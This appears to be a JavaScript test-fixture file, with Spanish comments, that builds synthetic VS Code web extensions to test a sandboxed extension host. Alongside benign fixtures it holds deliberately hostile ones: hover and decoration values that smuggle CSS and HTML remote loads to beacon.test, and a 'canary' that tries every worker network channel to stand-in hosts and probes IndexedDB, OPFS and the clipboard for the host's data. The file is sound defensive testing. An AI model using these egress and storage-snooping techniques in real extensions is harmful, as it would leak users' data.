// Extensiones web SINTÉTICAS para las pruebas del nivel 2: se fabrican aquí,
// sin red ni licencias de terceros. Cada una es { manifest, files } con el
// código en `files` (ruta → texto), como quedaría guardada tras instalarla.
//
//   sort      comando que ordena las líneas seleccionadas, con atajo
//   fmt       formateador de JavaScript (quita espacios repetidos)
//   hover     hover con markdown hostil (imágenes, enlaces, HTML)
//   sym       símbolos de documento (funciones de JavaScript)
//   diag      diagnósticos (cada «TODO» es un aviso)
//   ui        pide respuestas al usuario al arrancar (avisos, selector, texto)
//   noop      un comando que no hace nada
//   observer  hover, autocompletado y símbolos para todo, siempre vacíos
//   canary    intenta salir a la red y leer el almacenamiento de Code por
//             todos los canales que tiene un worker; informa de cada intento

const base = (name, extra = {}) => ({
  name, publisher: 'elffuss-test', version: '1.0.0', displayName: 'X2 ' + name, license: 'MIT',
  engines: { vscode: '^1.80.0' }, browser: './extension.js', ...extra,
});

export const SORT = {
  manifest: base('sort', {
    activationEvents: [],
    contributes: {
      commands: [{ command: 'x2sort.sortLines', title: 'Sort Lines (fixture)', category: 'X2' }],
      keybindings: [
        { command: 'x2sort.sortLines', key: 'f9', when: 'editorTextFocus' },
        { command: 'x2sort.sortLines', key: 'ctrl+p', mac: 'cmd+p' },
      ],
    },
  }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  context.subscriptions.push(vscode.commands.registerCommand('x2sort.sortLines', async () => {
    const ed = vscode.window.activeTextEditor;
    if (!ed) return 'no-editor';
    const doc = ed.document, sel = ed.selection;
    const first = sel.isEmpty ? 0 : sel.start.line;
    let last = sel.isEmpty ? doc.lineCount - 1 : sel.end.line;
    if (!sel.isEmpty && sel.end.character === 0 && last > first) last--;
    const lines = [];
    for (let i = first; i <= last; i++) lines.push(doc.lineAt(i).text);
    const sorted = [...lines].sort();
    const range = new vscode.Range(first, 0, last, doc.lineAt(last).text.length);
    await ed.edit(b => b.replace(range, sorted.join('\\n')));
    return 'sorted:' + lines.length;
  }));
};
`,
  },
};

export const FMT = {
  manifest: base('fmt', { activationEvents: ['onLanguage:javascript'] }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  context.subscriptions.push(vscode.languages.registerDocumentFormattingEditProvider('javascript', {
    provideDocumentFormattingEdits(doc) {
      const text = doc.getText();
      const out = text.split('\\n').map(l => l.replace(/(\\S) {2,}/g, '$1 ').replace(/\\s+$/, '')).join('\\n');
      if (out === text) return [];
      const end = doc.lineAt(doc.lineCount - 1).range.end;
      return [vscode.TextEdit.replace(new vscode.Range(new vscode.Position(0, 0), end), out)];
    },
  }));
};
`,
  },
};

export const HOSTILE_MD = '**x2 hover** ![img](http://beacon.test/hover.png) [link](https://beacon.test/link) <img src="http://beacon.test/html.png"> https://beacon.test/auto `code`';
export const HOVER = {
  manifest: base('hover', { activationEvents: ['onLanguage:javascript'] }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  context.subscriptions.push(vscode.languages.registerHoverProvider({ language: 'javascript' }, {
    provideHover(doc, pos) {
      const md = new vscode.MarkdownString(${JSON.stringify(HOSTILE_MD)});
      md.isTrusted = true; md.supportHtml = true;
      return new vscode.Hover(md);
    },
  }));
};
`,
  },
};

export const SYM = {
  manifest: base('sym', { activationEvents: ['onLanguage:javascript'] }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  context.subscriptions.push(vscode.languages.registerDocumentSymbolProvider('javascript', {
    provideDocumentSymbols(doc) {
      const out = [];
      for (let i = 0; i < doc.lineCount; i++) {
        const m = /function\\s+([A-Za-z_$][\\w$]*)/.exec(doc.lineAt(i).text);
        if (m) {
          const r = doc.lineAt(i).range;
          const s = new vscode.Range(i, m.index + 9, i, m.index + 9 + m[1].length);
          out.push(new vscode.DocumentSymbol('x2:' + m[1], 'fixture', vscode.SymbolKind.Function, r, s));
        }
      }
      return out;
    },
  }, { label: 'X2 symbols' }));
};
`,
  },
};

// Diagnósticos propios (cada «TODO»), y x2diag.pageMarkers: los que la
// extensión ve de otros (los de la página: el TS de Monaco).
export const DIAG = {
  manifest: base('diag', { activationEvents: ['onLanguage:javascript'], contributes: { commands: [{ command: 'x2diag.pageMarkers', title: 'Page markers', category: 'X2' }] } }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  const col = vscode.languages.createDiagnosticCollection('x2diag');
  context.subscriptions.push(col);
  const scan = doc => {
    if (doc.languageId !== 'javascript') return;
    const out = [];
    for (let i = 0; i < doc.lineCount; i++) {
      const j = doc.lineAt(i).text.indexOf('TODO');
      if (j >= 0) {
        const d = new vscode.Diagnostic(new vscode.Range(i, j, i, j + 4), 'x2: TODO found ![x](http://beacon.test/diag.png)', vscode.DiagnosticSeverity.Warning);
        d.source = 'x2diag';
        d.code = { value: 'X2001', target: vscode.Uri.parse('https://beacon.test/code') };
        out.push(d);
      }
    }
    col.set(doc.uri, out);
  };
  vscode.workspace.textDocuments.forEach(scan);
  context.subscriptions.push(vscode.workspace.onDidOpenTextDocument(scan), vscode.workspace.onDidChangeTextDocument(e => scan(e.document)));
  context.subscriptions.push(vscode.commands.registerCommand('x2diag.pageMarkers', () => {
    const ed = vscode.window.activeTextEditor;
    return JSON.stringify(ed ? vscode.languages.getDiagnostics(ed.document.uri).filter(d => d.source !== 'x2diag').map(d => d.message) : []);
  }));
};
`,
  },
};

// Decoraciones con valores hostiles mezclados con buenos: la página se queda
// solo con los buenos (colores, márgenes) y pinta el texto «antes» como texto.
export const DECO = {
  manifest: base('deco', { activationEvents: ['onLanguage:javascript'] }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  const t = vscode.window.createTextEditorDecorationType({
    backgroundColor: 'rgba(255, 0, 0, 0.25)', color: new vscode.ThemeColor('editorError.foreground'),
    border: '1px solid red; background-image: url(http://deco.beacon.test/border.png)',
    textDecoration: 'none; background: url(http://deco.beacon.test/td.png)',
    fontFamily: 'x; src: url(http://deco.beacon.test/font.woff)', cursor: 'url(http://deco.beacon.test/cur.png), pointer',
    gutterIconPath: vscode.Uri.parse('http://deco.beacon.test/gutter.png'), overviewRulerColor: 'red',
    before: { contentText: 'x2deco>', color: 'url(http://deco.beacon.test/c.png)', margin: '0 4px 0 0' },
    light: { backgroundColor: '#00ff0033' }, dark: { backgroundColor: '#0000ff33' },
  });
  const apply = ed => {
    if (!ed || ed.document.languageId !== 'javascript') return;
    const ranges = [];
    for (let i = 0; i < ed.document.lineCount; i++) {
      const j = ed.document.lineAt(i).text.indexOf('TODO');
      if (j >= 0) ranges.push({ range: new vscode.Range(i, j, i, j + 4), hoverMessage: new vscode.MarkdownString('x2 deco ![i](http://deco.beacon.test/hover.png)') });
    }
    ed.setDecorations(t, ranges);
  };
  apply(vscode.window.activeTextEditor);
  context.subscriptions.push(t, vscode.window.onDidChangeActiveTextEditor(apply),
    vscode.workspace.onDidChangeTextDocument(e => { const ed = vscode.window.activeTextEditor; if (ed && e.document === ed.document) apply(ed); }));
};
`,
  },
};

// Pide cosas al usuario. Al arrancar lee el portapapeles (vacío). x2ui.clip
// escribe en él (la página solo lo hace con un gesto reciente del usuario).
// Con x2ui.ask: un aviso con botones (texto con HTML y un enlace, que deben
// quedar en texto), un aviso modal, un selector, uno de varios, y un cuadro de
// texto con validación. x2ui.progress: progreso en la barra de estado.
// x2ui.open(url): openExternal con un vscode.Uri. x2ui.note y x2ui.question:
// un aviso sin botones y uno con botones.
export const UI = {
  manifest: base('ui', { activationEvents: ['onStartupFinished'], contributes: { commands: [
    { command: 'x2ui.ask', title: 'UI ask', category: 'X2' },
    { command: 'x2ui.report', title: 'UI report', category: 'X2' },
    { command: 'x2ui.progress', title: 'UI progress', category: 'X2' },
    { command: 'x2ui.clip', title: 'UI clipboard', category: 'X2' },
    { command: 'x2ui.open', title: 'UI open address', category: 'X2' },
    { command: 'x2ui.note', title: 'UI note', category: 'X2' },
    { command: 'x2ui.question', title: 'UI question', category: 'X2' },
  ] } }),
  files: {
    'extension.js': `const vscode = require('vscode');
const out = {};
let n = 0;
exports.activate = async function (context) {
  out.clipboardRead = await vscode.env.clipboard.readText();
  context.subscriptions.push(
    vscode.commands.registerCommand('x2ui.clip', async () => { n++; await vscode.env.clipboard.writeText('x2 clipboard ' + n); return n; }),
    vscode.commands.registerCommand('x2ui.ask', async () => {
      out.info = await vscode.window.showInformationMessage('x2 asks <b>bold</b> [link](https://toast.beacon.test/t)', 'Yes', 'No');
      out.modal = await vscode.window.showWarningMessage('x2 modal', { modal: true, detail: 'x2 detail' }, 'OK');
      out.pick = await vscode.window.showQuickPick(['a', 'b', 'c'], { placeHolder: 'x2 pick' });
      const many = await vscode.window.showQuickPick([{ label: 'one' }, { label: 'two', picked: true }, { label: 'three' }], { canPickMany: true });
      out.many = many ? many.map(x => x.label) : many;
      out.input = await vscode.window.showInputBox({ prompt: 'x2 input', validateInput: v => (v === 'bad' ? 'x2 not that' : null) });
      return JSON.stringify(out);
    }),
    vscode.commands.registerCommand('x2ui.report', () => JSON.stringify(out)),
    // abrir una dirección como lo hacen las extensiones: con un vscode.Uri
    vscode.commands.registerCommand('x2ui.open', async url => String(await vscode.env.openExternal(vscode.Uri.parse(String(url))))),
    // un aviso sin botones (se va solo) y uno con botones (espera la respuesta)
    vscode.commands.registerCommand('x2ui.note', async () => { await vscode.window.showInformationMessage('x2 note'); return 'closed'; }),
    vscode.commands.registerCommand('x2ui.question', async () => String(await vscode.window.showWarningMessage('x2 question', 'Keep', 'Drop'))),
    vscode.commands.registerCommand('x2ui.progress', () => vscode.window.withProgress({ location: vscode.ProgressLocation.Notification, title: 'x2 working' }, async p => {
      p.report({ message: 'half' });
      await new Promise(r => setTimeout(r, 1500));
      return 'done';
    })),
  );
};
`,
  },
};

// Pide cosas que el cortafuegos de RPC del recinto rechaza: una webview y
// guardar todo. La extensión recibe el error; la página cuenta el rechazo.
export const DENY = {
  manifest: base('deny', { activationEvents: [], contributes: { commands: [{ command: 'x2deny.report', title: 'Deny report', category: 'X2' }] } }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = c => c.subscriptions.push(vscode.commands.registerCommand('x2deny.report', async () => {
  const out = {};
  try { const p = vscode.window.createWebviewPanel('x2', 'x2', vscode.ViewColumn.One, {}); out.webview = 'returned'; p.dispose(); } catch (e) { out.webview = 'threw: ' + (e && e.message); }
  try { out.saveAll = await vscode.workspace.saveAll(); } catch (e) { out.saveAll = 'threw: ' + (e && e.message); }
  return JSON.stringify(out);
}));
`,
  },
};

export const NOOP = {
  manifest: base('noop', { contributes: { commands: [{ command: 'x2noop.hello', title: 'Hello (fixture)', category: 'X2' }] } }),
  files: { 'extension.js': `const vscode = require('vscode');\nexports.activate = c => c.subscriptions.push(vscode.commands.registerCommand('x2noop.hello', () => 'hello'));\n` },
};

export const OBSERVER = {
  manifest: base('observer', { activationEvents: ['*'] }),
  files: {
    'extension.js': `const vscode = require('vscode');
exports.activate = function (context) {
  const all = [{ scheme: 'file' }, { scheme: 'untitled' }];
  context.subscriptions.push(
    vscode.languages.registerHoverProvider(all, { provideHover() { return null; } }),
    vscode.languages.registerCompletionItemProvider(all, { provideCompletionItems() { return []; } }),
    vscode.languages.registerDocumentSymbolProvider(all, { provideDocumentSymbols() { return []; } }),
  );
};
`,
  },
};

// Canario básico (el completo, con el fuzzer de campos y el simulacro, es de
// la parte B2): desde el worker del host de extensiones intenta cada canal de
// red y de almacenamiento, con nombres *.test únicos, y deja el resultado en
// el comando x2canary.report.
export const CANARY = {
  manifest: base('canary', { activationEvents: ['*'], contributes: { commands: [{ command: 'x2canary.report', title: 'Canary report', category: 'X2' }] } }),
  files: {
    'extension.js': `const vscode = require('vscode');
const results = [];
const tryIt = async (channel, fn) => {
  try { const r = await fn(); results.push({ channel, outcome: 'ALLOWED', detail: String(r).slice(0, 200) }); }
  catch (e) { results.push({ channel, outcome: 'blocked', detail: String(e && (e.message || e)).slice(0, 200) }); }
};
const B = n => 'http://' + n + '.beacon.test:' + (self.__beaconPort || 80) + '/x2-canary/' + n;
async function run(port) {
  self.__beaconPort = port;
  await tryIt('fetch', () => fetch(B('fetch'), { mode: 'no-cors' }).then(r => r.type));
  await tryIt('fetch-loopback', () => fetch('http://127.0.0.1:' + port + '/x2-canary/loopback', { mode: 'no-cors' }).then(r => r.type));
  await tryIt('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', B('xhr')); x.onload = () => res(x.status); x.onerror = () => rej(new Error('xhr error')); x.send(); }));
  await tryIt('sendBeacon', () => { if (!self.navigator.sendBeacon) throw new Error('no sendBeacon'); return self.navigator.sendBeacon(B('beacon'), 'x'); });
  await tryIt('websocket', () => new Promise((res, rej) => { const w = new WebSocket(B('ws').replace('http', 'ws')); w.onopen = () => res('open'); w.onerror = () => rej(new Error('ws error')); setTimeout(() => rej(new Error('ws timeout')), 3000); }));
  await tryIt('eventsource', () => new Promise((res, rej) => { if (!self.EventSource) return rej(new Error('no EventSource')); const s = new EventSource(B('sse')); s.onopen = () => res('open'); s.onerror = () => { s.close(); rej(new Error('sse error')); }; }));
  await tryIt('import', () => import(B('import')));
  await tryIt('importScripts', () => importScripts(B('importscripts')));
  await tryIt('worker', () => new Promise((res, rej) => { try { const w = new Worker(B('worker')); w.onerror = () => rej(new Error('worker error')); setTimeout(() => res('created'), 1000); } catch (e) { rej(e); } }));
  await tryIt('open-vsx', () => fetch('https://open-vsx.org/api/-/search?query=x2-canary', { mode: 'no-cors' }).then(r => r.type));
  await tryIt('webrtc', () => { if (typeof RTCPeerConnection === 'undefined') throw new Error('no RTCPeerConnection'); return new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.beacon.test:3478' }] }); });
  await tryIt('indexedDB', () => (indexedDB.databases ? indexedDB.databases() : Promise.resolve([])).then(d => { const names = d.map(x => x.name); if (names.some(n => /elffuss/.test(n))) throw new Error('SAW CODE STORAGE: ' + names.join(',')); return 'own: ' + names.join(','); }));
  await tryIt('opfs', async () => { const root = await navigator.storage.getDirectory(); const names = []; for await (const k of root.keys()) names.push(k); if (names.some(n => /canary|app\\.js/.test(n))) throw new Error('SAW CODE OPFS: ' + names.join(',')); return 'own: ' + names.join(','); });
  await tryIt('caches', async () => { if (!self.caches) return 'no caches'; const k = await caches.keys(); return 'own: ' + k.join(','); });
  await tryIt('clipboard', async () => { if (!navigator.clipboard) throw new Error('no clipboard'); return navigator.clipboard.readText(); });
  await tryIt('openExternal', () => vscode.env.openExternal(vscode.Uri.parse(B('open'))).then(ok => { if (ok) throw new Error('opened'); return 'refused'; }));
  await tryIt('asExternalUri', () => vscode.env.asExternalUri(vscode.Uri.parse(B('asexternal'))).then(u => u.toString()));
  await tryIt('clipboard-api', () => vscode.env.clipboard.readText().then(t => 'read ' + t.length + ' chars'));
  return results;
}
exports.activate = function (context) {
  context.subscriptions.push(vscode.commands.registerCommand('x2canary.report', async port => {
    results.length = 0;
    await run(Number(port) || 80);
    return JSON.stringify(results);
  }));
};
`,
  },
};

export const ALL = { SORT, FMT, HOVER, SYM, DIAG, DECO, UI, DENY, NOOP, OBSERVER, CANARY };

// Registro tal como lo guarda store.js (nivel 2): `runs` encendido y el
// código bajo id@versión/code/<ruta>. Se usa dentro de la página:
//   await seed(page, [SORT, FMT])
export function recordFor(fx, { runs = true, enabled = true } = {}) {
  const id = `${fx.manifest.publisher}.${fx.manifest.name}`.toLowerCase();
  const files = { ...fx.files, 'package.json': JSON.stringify(fx.manifest, null, 2) };
  const bytes = Object.values(files).reduce((n, t) => n + Buffer.byteLength(t), 0);
  return {
    rec: {
      id, publisher: fx.manifest.publisher, name: fx.manifest.name, version: fx.manifest.version,
      displayName: fx.manifest.displayName, description: '', license: 'MIT', sha256: '0'.repeat(64), verified: false,
      source: 'test', size: bytes, installedAt: Date.now(), enabled, runs,
      hasCode: true, ignored: [], pack: [], warnings: [], themes: [], grammars: [], snippets: [], languages: [], licenseKey: null,
      code: { entry: fx.manifest.browser, files: Object.keys(files), bytes, manifest: fx.manifest },
    },
    files,
  };
}

// Mete las extensiones en IndexedDB y en kv «extensions» desde la página
// (el mismo store.js de Code), como si se hubieran instalado.
export async function seed(page, fixtures, opts = {}) {
  const recs = fixtures.map(f => recordFor(f, opts));
  await page.evaluate(async recs => {
    const store = await import('/js/ext/store.js');
    for (const { rec, files } of recs) {
      const m = new Map();
      for (const [p, text] of Object.entries(files)) m.set(store.codeKey(rec.id, rec.version, p), new TextEncoder().encode(text).buffer);
      await store.put(rec, m);
    }
  }, recs);
  return recs.map(r => r.rec.id);
}
